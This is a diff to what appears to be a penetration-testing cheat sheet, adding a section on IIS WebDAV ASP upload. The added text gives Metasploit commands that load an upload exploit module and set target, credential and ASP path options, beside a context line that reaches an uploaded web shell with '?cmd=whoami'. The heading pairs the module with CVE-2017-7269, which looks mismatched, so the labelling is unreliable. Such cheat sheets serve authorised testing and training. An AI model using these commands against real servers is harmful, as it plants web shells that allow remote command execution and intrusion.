@@ -132,7 +132,20 @@ EOF
 # Browse to: http://<target>/webdav/shell.asp?cmd=whoami
 
 
+## IIS WebDAV ASP Upload (CVE-2017-7269)
 
+```bash
+msfconsole -q
+
+# Load the exploit module
+use exploit/windows/iis/iis_webdav_upload_asp
+
+# Set required options
+set RHOSTS 
+set HttpUsername 
+set HttpPassword 
+set PATH /webdav/%RAND%.asp
+```
 
 
 ## Directory Discovery with Gobuster
